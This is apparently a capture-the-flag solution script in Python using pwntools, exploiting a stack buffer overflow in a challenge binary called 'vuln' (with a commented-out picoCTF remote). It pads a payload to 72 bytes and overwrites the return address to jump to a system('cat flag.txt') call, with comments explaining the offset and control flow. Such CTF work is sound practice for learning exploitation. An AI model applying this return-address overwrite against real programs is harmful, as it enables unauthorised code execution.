#!/usr/bin/python3

from pwn import *

elf = ELF('vuln')

r= process('./vuln')

#io = remote('saturn.picoctf.net' ,57558)

system_addr = 0x40129a

payload = b'give me the flag\x00'.ljust(72) + p64(system_addr)
print(len(payload))
r.sendline(payload)

r.interactive()


# b'give me the flag\x00'.ljust(72) pads the 17-byte string with spaces to ensure it totals exactly 72 bytes, crucial for buffer alignment in exploits.

# from ghydra  :         0040129a 48 8d 3d        LEA        RDI,[s_cat_flag.txt_004020f3]                    = "cat flag.txt"
                 
# By looking at the c source code, there is a line calling system("cat flag.txt"). Therefore, we can simply overwrite the $rsp and jump to that line to run system(). But before reaching the rsp, we still need to avoid the program reaches to exit(1). Therefore, we will have to pass either if-statement.
